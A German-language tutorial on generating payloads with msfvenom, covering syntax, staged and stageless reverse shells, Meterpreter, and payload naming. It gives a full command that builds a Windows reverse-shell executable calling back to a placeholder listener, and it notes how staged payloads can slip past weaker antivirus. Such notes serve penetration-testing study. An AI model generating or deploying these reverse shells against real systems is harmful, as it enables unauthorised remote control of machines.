
# Generelle Infos 

*Der "einmal hin alles drin" Payload laden*

msfvenom ist Teil des Metasploit-Frameworks und wird verwendet, um Code für Reverse- und Bind-Shells zu generieren. Es wird häufig bei der Entwicklung von Exploits auf niedrigerer Ebene verwendet, um hexadezimalen Shellcode zu generieren, wenn z. B. ein Pufferüberlauf-Exploit entwickelt wird; es kann jedoch auch verwendet werden, um Payloads in verschiedenen Formaten zu generieren (z. B. .exe, .aspx, .war, .py)

Standard Syntax:

```
msfvenom -p <Payload> <Options>
```

Beispiel anhand einer Windows x64 TCP Reverse shell

```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```

Erklärung der Optionen:
-f * Format *
	 -> Spezifiziert den output hier auf eine *.exe
  
-o * File *
	-> Die Output Location und den Dateinamen der Generierten Payload
 
LHOST=* ip *
	-> Spezifiziert die IP für das Call Back der Reverse shell
 
LPORT=* port* 
	-> Spezifiziert den Call back port meistens bei Metasploit 4444



# Staged und Stageless

Generell werden Payloads in zwei Konzepte unterteilt Staged und Stageless reverse shell payloads, siehe unterhalb erklärt. Stageless Payloads sind in der Regel einfacher zu verwenden und abzufangen; sie sind jedoch auch sperriger und können von einem Antiviren- oder Eindringlingserkennungsprogramm leichter entdeckt und entfernt werden. Staged Payloads sind schwieriger zu verwenden, aber der erste Stager ist viel kürzer und wird manchmal von weniger effektiven Antivirenprogrammen übersehen. Moderne Antivirenlösungen nutzen auch das Anti-Malware Scan Interface (AMSI), um die Payload zu erkennen, wenn sie vom Stager in den Speicher geladen wird, so dass gestaffelte Payloads in diesem Bereich weniger effektiv sind als früher.

### Staged

Gestufte Payloads werden in zwei Teilen gesendet. Der erste Teil wird als Stager bezeichnet. Dabei handelt es sich um einen Teil des Codes, der direkt auf dem Server selbst ausgeführt wird. Er stellt eine Verbindung zu einem wartenden Listener her, enthält aber selbst keinen Reverse-Shell-Code. Stattdessen verbindet er sich mit dem Listener und nutzt die Verbindung, um die eigentliche Payload zu laden, sie direkt auszuführen und zu verhindern, dass sie auf die Festplatte gelangt, wo sie von herkömmlichen Antivirenlösungen abgefangen werden könnte. So wird die Payload in zwei Teile aufgeteilt - einen kleinen anfänglichen Stager und dann den umfangreicheren Reverse-Shell-Code, der heruntergeladen wird, wenn der Stager aktiviert wird. Staged Payloads erfordern einen speziellen Listener - normalerweise den Metasploit Multi/Handler

### Stageless

Stagless Payloads sind gebräuchlicher. Sie sind völlig eigenständig, da es nur ein Stück Code gibt, das bei Ausführung sofort eine Shell an den wartenden Listener zurückschickt.


# Meterpreter

Ein weiterer wichtiger Punkt im Zusammenhang mit Metasploit ist eine Meterpreter-Shell. Meterpreter-Shells sind die Metasploit-eigene Marke einer voll ausgestatteten Shell. Sie sind absolut stabil, was bei der Arbeit mit Windows-Zielen von großem Vorteil ist. Außerdem verfügen sie über eine Menge eingebauter Funktionen, wie z. B. das Hoch- und Herunterladen von Dateien. Wenn wir eines der Post-Exploitation-Tools von Metasploit verwenden wollen, müssen wir eine Meterpreter-Shell verwenden, aber das ist ein anderes Thema. Der Nachteil von Meterpreter-Shells ist, dass sie in Metasploit abgefangen werden müssen

# Payload Bennenungs Syntax 

Bei der Arbeit mit msfvenom ist es wichtig zu verstehen, wie das Benennungssystem funktioniert. Die grundlegende Konvention lautet wie folgt:
```
<OS>/<Arch>/<Payload>
```

Zum Beispiel:
```
linux/x86/shell_reverse_tcp
```

Dies würde eine stufenlose Reverse-Shell für ein x86-Linux-Ziel erzeugen.
Die Ausnahme zu dieser Konvention sind Windows 32bit-Ziele. Für diese wird der Arch nicht angegeben. z.B.:

```
windows/shell_reverse_tcp
```

Für ein 64-Bit-Windows-Ziel wird der Arch wie üblich angegeben (x64).

Schauen wir uns den Payload-Abschnitt etwas genauer an.

In den obigen Beispielen wurde als Payload `shell_reverse_tcp` verwendet. Das bedeutet, dass es sich um eine Stageless Payload handelt. Wie das? Stageless Payloads werden mit Unterstrichen (_) gekennzeichnet. Das gestufte Äquivalent zu dieser Payload wäre:
```
shell/reverse_tcp
```

**Gestufte Payloads werden mit einem weiteren Schrägstrich (/) gekennzeichnet.**

Diese Regel gilt auch für Meterpreter-Payloads. Ein Windows 64bit staged Meterpreter Payload würde wie folgt aussehen:
```
windows/x64/meterpreter/reverse_tcp
```
Ein Linux 32bit stageless Meterpreter Payload würde wie folgt aussehen:

```
linux/x86/meterpreter_reverse_tcp
```

